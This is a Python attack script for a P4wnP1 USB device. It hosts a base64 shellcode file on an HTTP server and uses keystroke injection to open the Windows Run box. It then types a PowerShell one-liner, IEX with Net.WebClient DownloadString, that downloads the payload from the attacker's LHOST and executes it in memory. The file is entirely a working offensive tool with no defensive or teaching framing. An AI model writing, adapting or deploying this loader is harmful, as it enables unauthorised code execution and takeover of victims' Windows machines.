#!/usr/bin/env python3
import os, sys, time, multiprocessing, http.server, socketserver
P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from pathlib import Path
from hid_type import win_r, type_string

# Configuration
LHOST = os.getenv("P4WN_LHOST", "192.168.1.133")
PORT = 8000
PAYLOAD_DIR = Path("/opt/p4wnp1/payloads/hid/")
FILENAME = "shellcode.b64" #Generate with https://github.com/tylerdotrar/PoorMansArmory

def serve_payload():
    os.chdir(PAYLOAD_DIR)
    with socketserver.TCPServer(("0.0.0.0", PORT), http.server.SimpleHTTPRequestHandler) as httpd:
        print(f"[*] Serving {FILENAME} at http://{LHOST}:{PORT}/{FILENAME}")
        httpd.serve_forever()

def main():
    filepath = PAYLOAD_DIR / FILENAME
    if not filepath.exists():
        print(f"[!] Missing payload: {filepath}")
        return

    # Start HTTP server
    server = multiprocessing.Process(target=serve_payload)
    server.start()
    time.sleep(1.0)

    # Construct PowerShell loader command
    cmd = (f"powershell -c IEX((New-Object Net.WebClient).DownloadString('http://{LHOST}:{PORT}/{FILENAME}'))\n")

    win_r(); time.sleep(0.5)
    type_string(cmd)
    print("[*] In-memory shellcode payload injected!")
    time.sleep(2)
    server.terminate()

if __name__ == "__main__":
    main()
